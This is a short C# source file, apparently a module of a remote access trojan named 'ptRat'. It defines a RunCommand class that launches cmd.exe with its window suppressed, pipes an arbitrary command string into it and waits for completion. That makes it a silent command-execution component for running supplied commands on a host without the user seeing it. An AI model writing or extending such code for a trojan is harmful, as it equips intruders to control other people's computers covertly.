using System.Diagnostics;

namespace ptRat.Lib
{
    internal class RunCommand
    {
        public RunCommand(string Command)
        {
            var Proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                }
            };
            Proc.Start();
            Proc.StandardInput.WriteLine(Command);
            Proc.StandardInput.Flush();
            Proc.StandardInput.Close();
            Proc.WaitForExit();
        }
    }
}
